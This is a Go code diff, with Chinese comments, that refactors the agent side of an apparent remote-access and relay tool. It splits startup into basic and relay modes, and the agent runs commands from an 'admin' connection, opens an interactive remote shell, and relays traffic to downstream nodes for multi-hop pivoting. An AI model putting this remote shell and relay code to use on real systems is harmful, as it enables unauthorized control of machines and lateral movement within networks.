@@ -16,26 +16,14 @@ import (
 
 var shellStarted = false
 var shellStdin io.WriteCloser
-var relayCtx *RelayContext // 全局变量，供 MsgRelayPacket 使用
 
-func StartAgent(conn net.Conn) {
+// ✅ 统一入口：默认 agent 启动模式
+func StartBasicAgent(conn net.Conn) {
 	for {
-		lengthBuf := make([]byte, 4)
-		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
-			log.Printf("[-] Connection closed or failed: %v", err)
-			return
-		}
-		length := bytesToUint32(lengthBuf)
-		data := make([]byte, length)
-		if _, err := io.ReadFull(conn, data); err != nil {
-			log.Printf("[-] Failed to read message body: %v", err)
-			return
-		}
-
-		msg, err := protocol.DecodeMessage(data)
+		msg, err := readMessageFromConn(conn)
 		if err != nil {
-			log.Printf("[-] Decode error: %v", err)
-			continue
+			log.Printf("[-] Agent connection closed: %v", err)
+			return
 		}
 
 		switch msg.Type {
@@ -44,39 +32,96 @@ func StartAgent(conn net.Conn) {
 		case protocol.MsgShell:
 			handleShellPTY(msg, conn)
 		case protocol.MsgStartRelay:
+			// 🔁 动态转为 relay 模式
 			handleStartRelay(msg, conn)
-		case protocol.MsgRelayAck:
-			var ack protocol.RelayAckPayload
-			if err := json.Unmarshal(msg.Payload, &ack); err != nil {
-				log.Println("[-] Decode relay_ack failed:", err)
-				return
-			}
-			log.Printf("[+] Relay register success: %s", ack.Message)
-
-		case protocol.MsgRelayError:
-			var errMsg protocol.RelayAckPayload
-			if err := json.Unmarshal(msg.Payload, &errMsg); err != nil {
-				log.Println("[-] Decode relay_error failed:", err)
-				return
-			}
-			log.Printf("[!] Relay register failed: %s", errMsg.Message)
-		case protocol.MsgRelayPacket:
-			var pkt protocol.RelayPacket
-			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
-				log.Println("[-] Decode relay_packet failed:", err)
-				break
-			}
-			if relayCtx != nil {
-				HandleRelayPacket(relayCtx, pkt)
-			} else {
-				log.Println("[-] Relay context not initialized")
-			}
+			return // 停止 BasicAgent 循环，由 relay 接管连接
 		default:
-			log.Println("[-] Unknown message type:", msg.Type)
+			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
 		}
 	}
 }
 
+// ✅ relay agent 的消息处理逻辑
+func StartRelayAgent(conn net.Conn, ctx *RelayContext) {
+	for {
+		msg, err := readMessageFromConn(conn)
+		if err != nil {
+			log.Printf("[-] RelayAgent connection error: %v", err)
+			return
+		}
+		switch msg.Type {
+		case protocol.MsgCommand:
+			handleCommand(msg, conn)
+		case protocol.MsgShell:
+			handleShellPTY(msg, conn)
+		case protocol.MsgRelayPacket:
+			var pkt protocol.RelayPacket
+			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
+				log.Println("[-] Decode relay_packet failed:", err)
+				continue
+			}
+			HandleRelayPacket(ctx, pkt)
+		case protocol.MsgRelayAck:
+			var ack protocol.RelayAckPayload
+			_ = json.Unmarshal(msg.Payload, &ack)
+			log.Printf("[+] Relay register success: %s", ack.Message)
+		case protocol.MsgRelayError:
+			var errMsg protocol.RelayAckPayload
+			_ = json.Unmarshal(msg.Payload, &errMsg)
+			log.Printf("[!] Relay register failed: %s", errMsg.Message)
+		default:
+			log.Printf("[-] RelayAgent unknown message type: %s", msg.Type)
+		}
+	}
+}
+
+// ✅ 处理 admin 发来的 startrelay 请求，动态切换为 relay 节点
+func handleStartRelay(msg protocol.Message, conn net.Conn) {
+	var payload protocol.StartRelayPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] StartRelay payload decode error:", err)
+		return
+	}
+
+	log.Printf("[*] Received startrelay: listen on %s, ID range [%d ~ %d]",
+		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)
+
+	ctx := &RelayContext{
+		SelfID:      payload.SelfID,
+		Registry:    node.NewRegistry(),
+		Topology:    node.NewNodeGraph(),
+		IDAllocator: common.NewIDAllocator(payload.IDStart, payload.Count),
+		Upstream:    conn,
+	}
+
+	go StartRelayListener(payload.ListenAddr, ctx)
+
+	ack := protocol.RelayReadyPayload{
+		SelfID:     ctx.SelfID,
+		ListenAddr: payload.ListenAddr,
+	}
+	data, _ := json.Marshal(ack)
+	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
+	buf, _ := protocol.EncodeMessage(resp)
+	conn.Write(buf)
+	StartRelayAgent(conn, ctx)
+}
+
+// ✅ 读取一个消息帧
+func readMessageFromConn(conn net.Conn) (protocol.Message, error) {
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		return protocol.Message{}, err
+	}
+	length := bytesToUint32(lengthBuf)
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		return protocol.Message{}, err
+	}
+	return protocol.DecodeMessage(data)
+}
+
+// ✅ 命令执行处理
 func handleCommand(msg protocol.Message, conn net.Conn) {
 	var payload map[string]string
 	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
@@ -91,14 +136,12 @@ func handleCommand(msg protocol.Message, conn net.Conn) {
 		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
 	}
 
-	resp := protocol.Message{
-		Type:    protocol.MsgResponse,
-		Payload: output,
-	}
+	resp := protocol.Message{Type: protocol.MsgResponse, Payload: output}
 	data, _ := protocol.EncodeMessage(resp)
 	conn.Write(data)
 }
 
+// ✅ shell 模式处理（支持远程交互）
 func handleShellPTY(msg protocol.Message, conn net.Conn) {
 	line := string(msg.Payload)
 
@@ -124,22 +167,13 @@ func handleShellPTY(msg protocol.Message, conn net.Conn) {
 					Type:    protocol.MsgShell,
 					Payload: buf[:n],
 				}
-				data, err := protocol.EncodeMessage(msg)
-				if err != nil {
-					log.Println("[-] Shell encode error:", err)
-					return
-				}
-				_, err = conn.Write(data)
-				if err != nil {
-					log.Println("[-] Shell write error:", err)
-					return
-				}
+				data, _ := protocol.EncodeMessage(msg)
+				conn.Write(data)
 			}
 		}()
 		return
 	}
 
-	// 已启动 shell，则写入 stdin
 	if !strings.HasSuffix(line, "\n") {
 		line += "\n"
 	}
@@ -148,54 +182,3 @@ func handleShellPTY(msg protocol.Message, conn net.Conn) {
 		log.Println("[-] Write to shell error:", err)
 	}
 }
-func handleStartRelay(msg protocol.Message, conn net.Conn) {
-	var payload protocol.StartRelayPayload
-	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
-		log.Println("[-] StartRelay payload decode error:", err)
-		return
-	}
-
-	log.Printf("[*] Received startrelay command: listen on %s, ID range [%d ~ %d]",
-		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)
-
-	// 创建本地结构
-	reg := node.NewRegistry()
-	topo := node.NewNodeGraph()
-	alloc := common.NewIDAllocator(payload.IDStart, payload.Count)
-
-	ctx := &RelayContext{
-		SelfID:      payload.SelfID, // 后续可传入或由自身记录
-		Registry:    reg,
-		Topology:    topo,
-		IDAllocator: alloc,
-		Upstream:    conn, // 保持与 admin 的通道
-	}
-	relayCtx = ctx
-	go StartRelayListener(payload.ListenAddr, ctx)
-	go StartAgent(conn)
-	// 上报成功
-	ack := protocol.RelayReadyPayload{
-		SelfID:     -1, // 此处为当前 agent 自己的 ID，建议 future enhancement 填入
-		ListenAddr: payload.ListenAddr,
-	}
-	data, _ := json.Marshal(ack)
-	resp := protocol.Message{
-		Type:    protocol.MsgRelayReady,
-		Payload: data,
-	}
-	buf, _ := protocol.EncodeMessage(resp)
-	conn.Write(buf)
-}
-
-/*
-✅ 补充建议（结构更优雅方案）
-
-后续可以考虑：
-
-    拆分 relay 与普通 agent 启动逻辑：
-
-        StartBasicAgent(conn)
-
-        StartRelayAgent(conn, ctx)
-
-    将 relay 端启动逻辑独立于 StartAgent()，更便于测试与维护。*/
